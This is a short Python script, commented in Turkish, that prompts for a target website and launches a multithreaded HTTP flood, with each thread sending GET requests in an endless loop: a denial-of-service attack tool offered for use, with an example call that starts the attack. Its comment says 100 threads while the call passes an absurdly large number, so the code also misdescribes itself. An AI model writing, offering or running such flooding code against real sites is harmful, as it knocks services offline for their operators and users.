import threading
import requests

# Hedef URL (web sitesi)
target_url = input("Hedef: ")

# HTTP isteklerini gönderme
def send_http_request():
    try:
        while True:
            response = requests.get(target_url)
            print(f"Request sent! Status code: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

# Saldırı başlatma
def http_flood(num_threads):
    threads = []

    for i in range(num_threads):
        thread = threading.Thread(target=send_http_request)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# Örnek kullanım
http_flood(10000000000000000)  # 100 paralel thread ile saldırı başlatır
